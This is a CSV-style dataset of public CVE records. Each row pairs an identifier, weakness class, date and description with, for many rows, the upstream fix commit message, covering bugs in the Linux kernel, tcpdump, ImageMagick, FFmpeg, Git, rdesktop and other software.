CVE-2019-13308,CWE-787,2019-07-05,ImageMagick 7.0.8-50 Q16 has a heap-based buffer overflow in MagickCore/fourier.c in ComplexImage.,
CVE-2018-9989,CWE-125,2018-04-10,"ARM mbed TLS before 2.1.11, before 2.7.2, and before 2.8.0 has a buffer over-read in ssl_parse_server_psk_hint() that could cause a crash on invalid input.",
CVE-2018-20182,CWE-119,2019-03-15,rdesktop versions up to and including v1.8.3 contain a Buffer Overflow over the global variables in the function seamless_process_line() that results in memory corruption and probably even a remote code execution.,This commit includes fixes for a set of 21 vulnerabilities in rdesktop when a malicious RDP server is used.  All vulnerabilities was identified and reported by Eyal Itkin.   * Add rdp_protocol_error function that is used in several fixes  * Refactor of process_bitmap_updates  * Fix possible integer overflow in s_check_rem() on 32bit arch  * Fix memory corruption in process_bitmap_data - CVE-2018-8794  * Fix remote code execution in process_bitmap_data - CVE-2018-8795  * Fix remote code execution in process_plane - CVE-2018-8797  * Fix Denial of Service in mcs_recv_connect_response - CVE-2018-20175  * Fix Denial of Service in mcs_parse_domain_params - CVE-2018-20175  * Fix Denial of Service in sec_parse_crypt_info - CVE-2018-20176  * Fix Denial of Service in sec_recv - CVE-2018-20176  * Fix minor information leak in rdpdr_process - CVE-2018-8791  * Fix Denial of Service in cssp_read_tsrequest - CVE-2018-8792  * Fix remote code execution in cssp_read_tsrequest - CVE-2018-8793  * Fix Denial of Service in process_bitmap_data - CVE-2018-8796  * Fix minor information leak in rdpsnd_process_ping - CVE-2018-8798  * Fix Denial of Service in process_secondary_order - CVE-2018-8799  * Fix remote code execution in in ui_clip_handle_data - CVE-2018-8800  * Fix major information leak in ui_clip_handle_data - CVE-2018-20174  * Fix memory corruption in rdp_in_unistr - CVE-2018-20177  * Fix Denial of Service in process_demand_active - CVE-2018-20178  * Fix remote code execution in lspci_process - CVE-2018-20179  * Fix remote code execution in rdpsnddbg_process - CVE-2018-20180  * Fix remote code execution in seamless_process - CVE-2018-20181  * Fix remote code execution in seamless_process_line - CVE-2018-20182
CVE-2018-13406,CWE-190,2018-07-06,An integer overflow in the uvesafb_setcmap function in drivers/video/fbdev/uvesafb.c in the Linux kernel before 4.17.4 could result in local attackers being able to crash the kernel or potentially elevate privileges because kmalloc_array is not used.,"cmap->len can get close to INT_MAX/2, allowing for an integer overflow in allocation. This uses kmalloc_array() instead to catch the condition.  Reported-by: Dr Silvio Cesare of InfoSect <silvio.cesare@gmail.com> Fixes: 8bdb3a2 (""uvesafb: the driver core"") Cc: stable@vger.kernel.org Signed-off-by: Kees Cook <keescook@chromium.org>"
CVE-2017-7524,CWE-522,2017-06-27,tpm2-tools versions before 1.1.1 are vulnerable to a password leak due to transmitting password in plaintext from client to server when generating HMAC.,"While not reachable in the current code base tools, a potential security bug lurked in tpm_kdfa().  If using that routine for an hmac authorization, the hmac was calculated using the tpm. A user of an object wishing to authenticate via hmac, would expect that the password is never sent to the tpm. However, since the hmac calculation relies on password, and is performed by the tpm, the password ends up being sent in plain text to the tpm.  The fix is to use openssl to generate the hmac on the host.  Fixes: CVE-2017-7524  Signed-off-by: William Roberts <william.c.roberts@intel.com>"
CVE-2018-1000880,CWE-119,2018-12-20,"libarchive version commit 9693801580c0cf7c70e862d305270a16b52826a7 onwards (release v3.2.0 onwards) contains a CWE-20: Improper Input Validation vulnerability in WARC parser - libarchive/archive_read_support_format_warc.c, _warc_read() that can result in DoS - quasi-infinite run time and disk usage from tiny file. This attack appear to be exploitable via the victim must open a specially crafted WARC file.",
CVE-2017-13015,CWE-125,2017-09-14,The EAP parser in tcpdump before 4.9.2 has a buffer over-read in print-eap.c:eap_print().,"This fixes a buffer over-read discovered by Bhargava Shastry, SecT/TU Berlin.  Add a test using the capture file supplied by the reporter(s), modified so the capture file won't be rejected as an invalid capture."
CVE-2016-7972,CWE-399,2017-03-03,The check_allocations function in libass/ass_shaper.c in libass before 0.13.4 allows remote attackers to cause a denial of service (memory allocation failure) via unspecified vectors.,
CVE-2017-13018,CWE-125,2017-09-14,The PGM parser in tcpdump before 4.9.2 has a buffer over-read in print-pgm.c:pgm_print().,"This fixes a buffer over-read discovered by Bhargava Shastry, SecT/TU Berlin.  Add a test using the capture file supplied by the reporter(s), modified so the capture file won't be rejected as an invalid capture."
CVE-2019-13225,CWE-476,2019-07-10,"A NULL Pointer Dereference in match_at() in regexec.c in Oniguruma 6.9.2 allows attackers to potentially cause denial of service by providing a crafted regular expression. Oniguruma issues often affect Ruby, as well as common optional libraries for PHP and Rust.",
CVE-2017-7962,CWE-369,2017-04-19,The iwgif_read_image function in imagew-gif.c in libimageworsener.a in ImageWorsener 1.3.0 allows remote attackers to cause a denial of service (divide-by-zero error and application crash) via a crafted file.,Fixes issue #15
CVE-2019-13134,CWE-401,2019-07-01,ImageMagick before 7.0.8-50 has a memory leak vulnerability in the function ReadVIFFImage in coders/viff.c.,
CVE-2016-9756,CWE-200,2016-12-28,"arch/x86/kvm/emulate.c in the Linux kernel before 4.8.12 does not properly initialize Code Segment (CS) in certain error cases, which allows local users to obtain sensitive information from kernel stack memory via a crafted application.","em_jmp_far and em_ret_far assumed that setting IP can only fail in 64 bit mode, but syzkaller proved otherwise (and SDM agrees). Code segment was restored upon failure, but it was left uninitialized outside of long mode, which could lead to a leak of host kernel stack. We could have fixed that by always saving and restoring the CS, but we take a simpler approach and just break any guest that manages to fail as the error recovery is error-prone and modern CPUs don't need emulator for this.  Found by syzkaller:    WARNING: CPU: 2 PID: 3668 at arch/x86/kvm/emulate.c:2217 em_ret_far+0x428/0x480   Kernel panic - not syncing: panic_on_warn set ...    CPU: 2 PID: 3668 Comm: syz-executor Not tainted 4.9.0-rc4+ #49   Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Bochs 01/01/2011    [...]   Call Trace:    [...] __dump_stack lib/dump_stack.c:15    [...] dump_stack+0xb3/0x118 lib/dump_stack.c:51    [...] panic+0x1b7/0x3a3 kernel/panic.c:179    [...] __warn+0x1c4/0x1e0 kernel/panic.c:542    [...] warn_slowpath_null+0x2c/0x40 kernel/panic.c:585    [...] em_ret_far+0x428/0x480 arch/x86/kvm/emulate.c:2217    [...] em_ret_far_imm+0x17/0x70 arch/x86/kvm/emulate.c:2227    [...] x86_emulate_insn+0x87a/0x3730 arch/x86/kvm/emulate.c:5294    [...] x86_emulate_instruction+0x520/0x1ba0 arch/x86/kvm/x86.c:5545    [...] emulate_instruction arch/x86/include/asm/kvm_host.h:1116    [...] complete_emulated_io arch/x86/kvm/x86.c:6870    [...] complete_emulated_mmio+0x4e9/0x710 arch/x86/kvm/x86.c:6934    [...] kvm_arch_vcpu_ioctl_run+0x3b7a/0x5a90 arch/x86/kvm/x86.c:6978    [...] kvm_vcpu_ioctl+0x61e/0xdd0 arch/x86/kvm/../../../virt/kvm/kvm_main.c:2557    [...] vfs_ioctl fs/ioctl.c:43    [...] do_vfs_ioctl+0x18c/0x1040 fs/ioctl.c:679    [...] SYSC_ioctl fs/ioctl.c:694    [...] SyS_ioctl+0x8f/0xc0 fs/ioctl.c:685    [...] entry_SYSCALL_64_fastpath+0x1f/0xc2  Reported-by: Dmitry Vyukov <dvyukov@google.com> Cc: stable@vger.kernel.org Fixes: d1442d8 (""KVM: x86: Handle errors when RIP is set during far jumps"") Signed-off-by: Radim Krčmář <rkrcmar@redhat.com>"
CVE-2013-0311,,2013-02-22,"The translate_desc function in drivers/vhost/vhost.c in the Linux kernel before 3.7 does not properly handle cross-region descriptors, which allows guest OS users to obtain host OS privileges by leveraging KVM guest OS privileges.","If a single descriptor crosses a region, the second chunk length should be decremented by size translated so far, instead it includes the full descriptor length.  Signed-off-by: Michael S. Tsirkin <mst@redhat.com> Acked-by: Jason Wang <jasowang@redhat.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2017-10662,,2017-08-19,"The sanity_check_raw_super function in fs/f2fs/super.c in the Linux kernel before 4.11.1 does not validate the segment count, which allows local users to gain privileges via unspecified vectors.","F2FS uses 4 bytes to represent block address. As a result, supported size of disk is 16 TB and it equals to 16 * 1024 * 1024 / 2 segments.  Signed-off-by: Jin Qian <jinqian@google.com> Signed-off-by: Jaegeuk Kim <jaegeuk@kernel.org>"
CVE-2017-17434,,2017-12-06,"The daemon in rsync 3.1.2, and 3.1.3-development before 2017-12-03, does not check for fnamecmp filenames in the daemon_filter_list data structure (in the recv_files function in receiver.c) and also does not apply the sanitize_paths protection mechanism to pathnames found in ""xname follows"" strings (in the read_ndx_and_attrs function in rsync.c), which allows remote attackers to bypass intended access restrictions.",
CVE-2013-7008,,2013-12-09,"The decode_slice_header function in libavcodec/h264.c in FFmpeg before 2.1 incorrectly relies on a certain droppable field, which allows remote attackers to cause a denial of service (deadlock) or possibly have unspecified other impact via crafted H.264 data.",This simplifies the code and fixes a deadlock  Fixes Ticket2927 Signed-off-by: Michael Niedermayer <michaelni@gmx.at>
CVE-2017-14059,CWE-834,2017-08-31,"In FFmpeg 3.3.3, a DoS in cine_read_header() due to lack of an EOF check might cause huge CPU and memory consumption. When a crafted CINE file, which claims a large ""duration"" field in the header but does not contain sufficient backing data, is provided, the image-offset parsing loop would consume huge CPU and memory resources, since there is no EOF check inside the loop.",Fixes: loop.cine  Found-by: Xiaohei and Wangchu from Alibaba Security Team Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>
CVE-2016-9755,CWE-787,2016-12-28,"The netfilter subsystem in the Linux kernel before 4.9 mishandles IPv6 reassembly, which allows local users to cause a denial of service (integer overflow, out-of-bounds write, and GPF) or possibly have unspecified other impact via a crafted application that makes socket, connect, and writev system calls, related to net/ipv6/netfilter/nf_conntrack_reasm.c and net/ipv6/netfilter/nf_defrag_ipv6_hooks.c.","Dmitry Vyukov reported GPF in network stack that Andrey traced down to negative nh offset in nf_ct_frag6_queue().  Problem is that all network headers before fragment header are pulled. Normal ipv6 reassembly will drop the skb when errors occur further down the line.  netfilter doesn't do this, and instead passed the original fragment along.  That was also fine back when netfilter ipv6 defrag worked with cloned fragments, as the original, pristine fragment was passed on.  So we either have to undo the pull op, or discard such fragments. Since they're malformed after all (e.g. overlapping fragment) it seems preferrable to just drop them.  Same for temporary errors -- it doesn't make sense to accept (and perhaps forward!) only some fragments of same datagram.  Fixes: 029f7f3 (""netfilter: ipv6: nf_defrag: avoid/free clone operations"") Reported-by: Dmitry Vyukov <dvyukov@google.com> Debugged-by: Andrey Konovalov <andreyknvl@google.com> Diagnosed-by: Eric Dumazet <Eric Dumazet <edumazet@google.com> Signed-off-by: Florian Westphal <fw@strlen.de> Acked-by: Eric Dumazet <edumazet@google.com> Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>"
CVE-2016-5351,CWE-20,2016-08-07,"epan/crypt/airpdcap.c in the IEEE 802.11 dissector in Wireshark 1.12.x before 1.12.12 and 2.x before 2.0.4 mishandles the lack of an EAPOL_RSN_KEY, which allows remote attackers to cause a denial of service (application crash) via a crafted packet.",A pointer to a EAPOL_RSN_KEY is set on the packet presuming the whole EAPOL_RSN_KEY is there.  That's not always the case for fuzzed/malicious captures.  Bug: 11585 Change-Id: Ib94b8aceef444c7820e43b969596efdb8dbecccd Reviewed-on: https://code.wireshark.org/review/15540 Reviewed-by: Michael Mann <mmann78@netscape.net> Petri-Dish: Michael Mann <mmann78@netscape.net> Tested-by: Petri Dish Buildbot <buildbot-no-reply@wireshark.org> Reviewed-by: Anders Broman <a.broman58@gmail.com>
CVE-2015-8830,,2016-05-02,Integer overflow in the aio_setup_single_vector function in fs/aio.c in the Linux kernel 4.0 allows local users to cause a denial of service or possibly have unspecified other impact via a large AIO iovec.  NOTE: this vulnerability exists because of a CVE-2012-6701 regression.,"In Linus's tree, the iovec code has been reworked massively, but in older kernels the AIO layer should be checking this before passing the request on to other layers.  Many thanks to Ben Hawkes of Google Project Zero for pointing out the issue.  Reported-by: Ben Hawkes <hawkes@google.com> Acked-by: Benjamin LaHaise <bcrl@kvack.org> Tested-by: Willy Tarreau <w@1wt.eu> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
CVE-2014-7284,CWE-200,2014-10-13,"The net_get_random_once implementation in net/core/utils.c in the Linux kernel 3.13.x and 3.14.x before 3.14.5 on certain Intel processors does not perform the intended slow-path operation to initialize random seeds, which makes it easier for remote attackers to spoof or disrupt IP communication by leveraging the predictability of TCP sequence numbers, TCP and UDP port numbers, and IP ID values.","net_get_random_once depends on the static keys infrastructure to patch up the branch to the slow path during boot. This was realized by abusing the static keys api and defining a new initializer to not enable the call site while still indicating that the branch point should get patched up. This was needed to have the fast path considered likely by gcc.  The static key initialization during boot up normally walks through all the registered keys and either patches in ideal nops or enables the jump site but omitted that step on x86 if ideal nops where already placed at static_key branch points. Thus net_get_random_once branches not always became active.  This patch switches net_get_random_once to the ordinary static_key api and thus places the kernel fast path in the - by gcc considered - unlikely path.  Microbenchmarks on Intel and AMD x86-64 showed that the unlikely path actually beats the likely path in terms of cycle cost and that different nop patterns did not make much difference, thus this switch should not be noticeable.  Fixes: a48e429 (""net: introduce new macro net_get_random_once"") Reported-by: Tuomas Räsänen <tuomasjjrasanen@tjjr.fi> Cc: Linus Torvalds <torvalds@linux-foundation.org> Signed-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2018-17456,CWE-88,2018-10-06,"Git before 2.14.5, 2.15.x before 2.15.3, 2.16.x before 2.16.5, 2.17.x before 2.17.2, 2.18.x before 2.18.1, and 2.19.x before 2.19.1 allows remote code execution during processing of a recursive ""git clone"" of a superproject if a .gitmodules file has a URL field beginning with a '-' character.","Urls with leading dashes can cause mischief on older versions of Git. We should detect them so that they can be rejected by receive.fsckObjects, preventing modern versions of git from being a vector by which attacks can spread.  Signed-off-by: Jeff King <peff@peff.net> Signed-off-by: Junio C Hamano <gitster@pobox.com>"
CVE-2018-20845,CWE-369,2019-06-26,"Division-by-zero vulnerabilities in the functions pi_next_pcrl, pi_next_cprl, and pi_next_rpcl in openmj2/pi.c in OpenJPEG through 2.3.0 allow remote attackers to cause a denial of service (application crash).",
CVE-2018-7998,CWE-362,2018-03-09,"In libvips before 8.6.3, a NULL function pointer dereference vulnerability was found in the vips_region_generate function in region.c, which allows remote attackers to cause a denial of service or possibly have unspecified other impact via a crafted image file. This occurs because of a race condition involving a failed delayed load and other worker threads.","If a delayed load failed, it could leave the pipeline only half-set up. Sebsequent threads could then segv.  Set a load-has-failed flag and test before generate.  See https://github.com/jcupitt/libvips/issues/893"
CVE-2017-13007,CWE-125,2017-09-14,The Apple PKTAP parser in tcpdump before 4.9.2 has a buffer over-read in print-pktap.c:pktap_if_print().,"The sub-dissector expects that the length and captured length will reflect the actual remaining data in the packet, not the raw amount including the PKTAP header; pass an updated header, just as we do for PPI.  This fixes a buffer over-read discovered by Yannick Formaggio.  Add a test using the capture file supplied by the reporter(s)."
CVE-2016-7097,CWE-285,2016-10-16,"The filesystem implementation in the Linux kernel through 4.8.2 preserves the setgid bit during a setxattr call, which allows local users to gain group privileges by leveraging the existence of a setgid program with restrictions on execute permissions.","When file permissions are modified via chmod(2) and the user is not in the owning group or capable of CAP_FSETID, the setgid bit is cleared in inode_change_ok().  Setting a POSIX ACL via setxattr(2) sets the file permissions as well as the new ACL, but doesn't clear the setgid bit in a similar way; this allows to bypass the check in chmod(2).  Fix that.  References: CVE-2016-7097 Reviewed-by: Christoph Hellwig <hch@lst.de> Reviewed-by: Jeff Layton <jlayton@redhat.com> Signed-off-by: Jan Kara <jack@suse.cz> Signed-off-by: Andreas Gruenbacher <agruenba@redhat.com>"
CVE-2014-3673,CWE-20,2014-11-10,"The SCTP implementation in the Linux kernel through 3.17.2 allows remote attackers to cause a denial of service (system crash) via a malformed ASCONF chunk, related to net/sctp/sm_make_chunk.c and net/sctp/sm_statefuns.c.","Commit 6f4c618 (""SCTP : Add paramters validity check for ASCONF chunk"") added basic verification of ASCONF chunks, however, it is still possible to remotely crash a server by sending a special crafted ASCONF chunk, even up to pre 2.6.12 kernels:  skb_over_panic: text:ffffffffa01ea1c3 len:31056 put:30768  head:ffff88011bd81800 data:ffff88011bd81800 tail:0x7950  end:0x440 dev:<NULL>  ------------[ cut here ]------------ kernel BUG at net/core/skbuff.c:129! [...] Call Trace:  <IRQ>  [<ffffffff8144fb1c>] skb_put+0x5c/0x70  [<ffffffffa01ea1c3>] sctp_addto_chunk+0x63/0xd0 [sctp]  [<ffffffffa01eadaf>] sctp_process_asconf+0x1af/0x540 [sctp]  [<ffffffff8152d025>] ? _read_unlock_bh+0x15/0x20  [<ffffffffa01e0038>] sctp_sf_do_asconf+0x168/0x240 [sctp]  [<ffffffffa01e3751>] sctp_do_sm+0x71/0x1210 [sctp]  [<ffffffff8147645d>] ? fib_rules_lookup+0xad/0xf0  [<ffffffffa01e6b22>] ? sctp_cmp_addr_exact+0x32/0x40 [sctp]  [<ffffffffa01e8393>] sctp_assoc_bh_rcv+0xd3/0x180 [sctp]  [<ffffffffa01ee986>] sctp_inq_push+0x56/0x80 [sctp]  [<ffffffffa01fcc42>] sctp_rcv+0x982/0xa10 [sctp]  [<ffffffffa01d5123>] ? ipt_local_in_hook+0x23/0x28 [iptable_filter]  [<ffffffff8148bdc9>] ? nf_iterate+0x69/0xb0  [<ffffffff81496d10>] ? ip_local_deliver_finish+0x0/0x2d0  [<ffffffff8148bf86>] ? nf_hook_slow+0x76/0x120  [<ffffffff81496d10>] ? ip_local_deliver_finish+0x0/0x2d0  [<ffffffff81496ded>] ip_local_deliver_finish+0xdd/0x2d0  [<ffffffff81497078>] ip_local_deliver+0x98/0xa0  [<ffffffff8149653d>] ip_rcv_finish+0x12d/0x440  [<ffffffff81496ac5>] ip_rcv+0x275/0x350  [<ffffffff8145c88b>] __netif_receive_skb+0x4ab/0x750  [<ffffffff81460588>] netif_receive_skb+0x58/0x60  This can be triggered e.g., through a simple scripted nmap connection scan injecting the chunk after the handshake, for example, ...    -------------- INIT[ASCONF; ASCONF_ACK] ------------->   <----------- INIT-ACK[ASCONF; ASCONF_ACK] ------------   -------------------- COOKIE-ECHO -------------------->   <-------------------- COOKIE-ACK ---------------------   ------------------ ASCONF; UNKNOWN ------------------>  ... where ASCONF chunk of length 280 contains 2 parameters ...    1) Add IP address parameter (param length: 16)   2) Add/del IP address parameter (param length: 255)  ... followed by an UNKNOWN chunk of e.g. 4 bytes. Here, the Address Parameter in the ASCONF chunk is even missing, too. This is just an example and similarly-crafted ASCONF chunks could be used just as well.  The ASCONF chunk passes through sctp_verify_asconf() as all parameters passed sanity checks, and after walking, we ended up successfully at the chunk end boundary, and thus may invoke sctp_process_asconf(). Parameter walking is done with WORD_ROUND() to take padding into account.  In sctp_process_asconf()'s TLV processing, we may fail in sctp_process_asconf_param() e.g., due to removal of the IP address that is also the source address of the packet containing the ASCONF chunk, and thus we need to add all TLVs after the failure to our ASCONF response to remote via helper function sctp_add_asconf_response(), which basically invokes a sctp_addto_chunk() adding the error parameters to the given skb.  When walking to the next parameter this time, we proceed with ...    length = ntohs(asconf_param->param_hdr.length);   asconf_param = (void *)asconf_param + length;  ... instead of the WORD_ROUND()'ed length, thus resulting here in an off-by-one that leads to reading the follow-up garbage parameter length of 12336, and thus throwing an skb_over_panic for the reply when trying to sctp_addto_chunk() next time, which implicitly calls the skb_put() with that length.  Fix it by using sctp_walk_params() [ which is also used in INIT parameter processing ] macro in the verification *and* in ASCONF processing: it will make sure we don't spill over, that we walk parameters WORD_ROUND()'ed. Moreover, we're being more defensive and guard against unknown parameter types and missized addresses.  Joint work with Vlad Yasevich.  Fixes: b896b82 (""[SCTP] ADDIP: Support for processing incoming ASCONF_ACK chunks."") Signed-off-by: Daniel Borkmann <dborkman@redhat.com> Signed-off-by: Vlad Yasevich <vyasevich@gmail.com> Acked-by: Neil Horman <nhorman@tuxdriver.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2017-8071,CWE-404,2017-04-23,"drivers/hid/hid-cp2112.c in the Linux kernel 4.9.x before 4.9.9 uses a spinlock without considering that sleeping is possible in a USB HID request callback, which allows local users to cause a denial of service (deadlock) via unspecified vectors.","A recent commit fixing DMA-buffers on stack added a shared transfer buffer protected by a spinlock. This is broken as the USB HID request callbacks can sleep. Fix this up by replacing the spinlock with a mutex.  Fixes: 1ffb3c4 (""HID: cp2112: make transfer buffers DMA capable"") Cc: stable <stable@vger.kernel.org>	# 4.9 Signed-off-by: Johan Hovold <johan@kernel.org> Reviewed-by: Benjamin Tissoires <benjamin.tissoires@redhat.com> Signed-off-by: Jiri Kosina <jkosina@suse.cz>"
CVE-2016-3062,CWE-119,2016-06-16,The mov_read_dref function in libavformat/mov.c in Libav before 11.7 and FFmpeg before 0.11 allows remote attackers to cause a denial of service (memory corruption) or execute arbitrary code via the entries value in a dref box in an MP4 file.,This fixes a potential crash.  Signed-off-by: Michael Niedermayer <michaelni@gmx.at>
CVE-2014-4014,CWE-264,2014-06-23,"The capabilities implementation in the Linux kernel before 3.14.8 does not properly consider that namespaces are inapplicable to inodes, which allows local users to bypass intended chmod restrictions by first creating a user namespace, as demonstrated by setting the setgid bit on a file with group ownership of root.","The kernel has no concept of capabilities with respect to inodes; inodes exist independently of namespaces.  For example, inode_capable(inode, CAP_LINUX_IMMUTABLE) would be nonsense.  This patch changes inode_capable to check for uid and gid mappings and renames it to capable_wrt_inode_uidgid, which should make it more obvious what it does.  Fixes CVE-2014-4014.  Cc: Theodore Ts'o <tytso@mit.edu> Cc: Serge Hallyn <serge.hallyn@ubuntu.com> Cc: ""Eric W. Biederman"" <ebiederm@xmission.com> Cc: Dave Chinner <david@fromorbit.com> Cc: stable@vger.kernel.org Signed-off-by: Andy Lutomirski <luto@amacapital.net> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2017-5547,CWE-119,2017-02-06,"drivers/hid/hid-corsair.c in the Linux kernel 4.9.x before 4.9.6 interacts incorrectly with the CONFIG_VMAP_STACK option, which allows local users to cause a denial of service (system crash or memory corruption) or possibly have unspecified other impact by leveraging use of more than one virtual page for a DMA scatterlist.","Not all platforms support DMA to the stack, and specifically since v4.9 this is no longer supported on x86 with VMAP_STACK either.  Note that the macro-mode buffer was larger than necessary.  Fixes: 6f78193 (""HID: corsair: Add Corsair Vengeance K90 driver"") Cc: stable <stable@vger.kernel.org> Signed-off-by: Johan Hovold <johan@kernel.org> Signed-off-by: Jiri Kosina <jkosina@suse.cz>"
CVE-2015-5156,CWE-119,2015-10-19,"The virtnet_probe function in drivers/net/virtio_net.c in the Linux kernel before 4.2 attempts to support a FRAGLIST feature without proper memory allocation, which allows guest OS users to cause a denial of service (buffer overflow and memory corruption) via a crafted sequence of fragmented packets.","virtio declares support for NETIF_F_FRAGLIST, but assumes that there are at most MAX_SKB_FRAGS + 2 fragments which isn't always true with a fraglist.  A longer fraglist in the skb will make the call to skb_to_sgvec overflow the sg array, leading to memory corruption.  Drop NETIF_F_FRAGLIST so we only get what we can handle.  Cc: Michael S. Tsirkin <mst@redhat.com> Signed-off-by: Jason Wang <jasowang@redhat.com> Acked-by: Michael S. Tsirkin <mst@redhat.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-3695,CWE-74,2017-12-29,The einj_error_inject function in drivers/acpi/apei/einj.c in the Linux kernel allows local users to simulate hardware errors and consequently cause a denial of service by leveraging failure to disable APEI error injection through EINJ when securelevel is set.,"ACPI provides an error injection mechanism, EINJ, for debugging and testing the ACPI Platform Error Interface (APEI) and other RAS features. If supported by the firmware, ACPI specification 5.0 and later provide for a way to specify a physical memory address to which to inject the error.  Injecting errors through EINJ can produce errors which to the platform are indistinguishable from real hardware errors. This can have undesirable side-effects, such as causing the platform to mark hardware as needing replacement.  While it does not provide a method to load unauthenticated privileged code, the effect of these errors may persist across reboots and affect trust in the underlying hardware, so disable error injection through EINJ if securelevel is set.  Signed-off-by: Linn Crosetto <linn@hpe.com>"
CVE-2014-0038,CWE-20,2014-02-06,"The compat_sys_recvmmsg function in net/compat.c in the Linux kernel before 3.13.2, when CONFIG_X86_X32 is enabled, allows local users to gain privileges via a recvmmsg system call with a crafted timeout pointer parameter.","The x32 case for the recvmsg() timout handling is broken:    asmlinkage long compat_sys_recvmmsg(int fd, struct compat_mmsghdr __user *mmsg,                                       unsigned int vlen, unsigned int flags,                                       struct compat_timespec __user *timeout)   {           int datagrams;           struct timespec ktspec;            if (flags & MSG_CMSG_COMPAT)                   return -EINVAL;            if (COMPAT_USE_64BIT_TIME)                   return __sys_recvmmsg(fd, (struct mmsghdr __user *)mmsg, vlen,                                         flags | MSG_CMSG_COMPAT,                                         (struct timespec *) timeout);           ...  The timeout pointer parameter is provided by userland (hence the __user annotation) but for x32 syscalls it's simply cast to a kernel pointer and is passed to __sys_recvmmsg which will eventually directly dereference it for both reading and writing.  Other callers to __sys_recvmmsg properly copy from userland to the kernel first.  The bug was introduced by commit ee4fa23 (""compat: Use COMPAT_USE_64BIT_TIME in net/compat.c"") and should affect all kernels since 3.4 (and perhaps vendor kernels if they backported x32 support along with this code).  Note that CONFIG_X86_X32_ABI gets enabled at build time and only if CONFIG_X86_X32 is enabled and ld can build x32 executables.  Other uses of COMPAT_USE_64BIT_TIME seem fine.  This addresses CVE-2014-0038.  Signed-off-by: PaX Team <pageexec@freemail.hu> Signed-off-by: H. Peter Anvin <hpa@linux.intel.com> Cc: <stable@vger.kernel.org> # v3.4+ Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2014-3158,CWE-119,2014-11-15,"Integer overflow in the getword function in options.c in pppd in Paul's PPP Package (ppp) before 2.4.7 allows attackers to ""access privileged options"" via a long word in an options file, which triggers a heap-based buffer overflow that ""[corrupts] security-relevant variables.""","When we are reading in a word from an options file, we maintain a count of the length we have seen so far in 'len', which is an int.  When len exceeds MAXWORDLEN - 1 (i.e. 1023) we cease storing characters in the buffer but we continue to increment len.  Since len is an int, it will wrap around to -2147483648 after it reaches 2147483647.  At that point our test of (len < MAXWORDLEN-1) will succeed and we will start writing characters to memory again.  This may enable an attacker to overwrite the heap and thereby corrupt security-relevant variables.  For this reason it has been assigned a CVE identifier, CVE-2014-3158.  This fixes the bug by ceasing to increment len once it reaches MAXWORDLEN.  Reported-by: Lee Campbell <leecam@google.com> Signed-off-by: Paul Mackerras <paulus@samba.org>"
CVE-2012-2893,CWE-399,2012-09-26,"Double free vulnerability in libxslt, as used in Google Chrome before 22.0.1229.79, allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to XSL transforms.",
CVE-2017-12994,CWE-125,2017-09-14,The BGP parser in tcpdump before 4.9.2 has a buffer over-read in print-bgp.c:bgp_attr_print().,"The loop can be executed more than once (that's kinda the whole point of a loop), so the check has to be made each time through the loop, not just once before the loop is executed.  Do some additional length checks while we're at it.  This fixes a buffer over-read discovered by Forcepoint's security researchers Otto Airamo & Antti Levomäki.  Add a test using the capture file supplied by the reporter(s)."
CVE-2017-10807,CWE-287,2017-07-04,"JabberD 2.x (aka jabberd2) before 2.6.1 allows anyone to authenticate using SASL ANONYMOUS, even when the sasl.anonymous c2s.xml option is not enabled.",
CVE-2017-13046,CWE-125,2017-09-14,The BGP parser in tcpdump before 4.9.2 has a buffer over-read in print-bgp.c:bgp_attr_print().,"This fixes a buffer over-read discovered by Bhargava Shastry, SecT/TU Berlin.  Add a test using the capture file supplied by the reporter(s)."
CVE-2019-14284,CWE-369,2019-07-26,"In the Linux kernel before 5.2.3, drivers/block/floppy.c allows a denial of service by setup_format_params division-by-zero. Two consecutive ioctls can trigger the bug: the first one should set the drive geometry with .sect and .rate values that make F_SECT_PER_TRACK be zero. Next, the floppy format operation should be called. It can be triggered by an unprivileged local user even when a floppy disk has not been inserted. NOTE: QEMU creates the floppy device by default.","This fixes a divide by zero error in the setup_format_params function of the floppy driver.  Two consecutive ioctls can trigger the bug: The first one should set the drive geometry with such .sect and .rate values for the F_SECT_PER_TRACK to become zero.  Next, the floppy format operation should be called.  A floppy disk is not required to be inserted.  An unprivileged user could trigger the bug if the device is accessible.  The patch checks F_SECT_PER_TRACK for a non-zero value in the set_geometry function.  The proper check should involve a reasonable upper limit for the .sect and .rate fields, but it could change the UAPI.  The patch also checks F_SECT_PER_TRACK in the setup_format_params, and cancels the formatting operation in case of zero.  The bug was found by syzkaller.  Signed-off-by: Denis Efremov <efremov@ispras.ru> Tested-by: Willy Tarreau <w@1wt.eu> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2017-17858,CWE-119,2018-01-22,"Heap-based buffer overflow in the ensure_solid_xref function in pdf/pdf-xref.c in Artifex MuPDF 1.12.0 allows a remote attacker to potentially execute arbitrary code via a crafted PDF file, because xref subsection object numbers are unrestricted.",
CVE-2016-6197,CWE-20,2016-08-06,"fs/overlayfs/dir.c in the OverlayFS filesystem implementation in the Linux kernel before 4.6 does not properly verify the upper dentry before proceeding with unlink and rename system-call processing, which allows local users to cause a denial of service (system crash) via a rename system call that specifies a self-hardlink.","Unlink and rename in overlayfs checked the upper dentry for staleness by verifying upper->d_parent against upperdir.  However the dentry can go stale also by being unhashed, for example.  Expand the verification to actually look up the name again (under parent lock) and check if it matches the upper dentry.  This matches what the VFS does before passing the dentry to filesytem's unlink/rename methods, which excludes any inconsistency caused by overlayfs.  Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>"
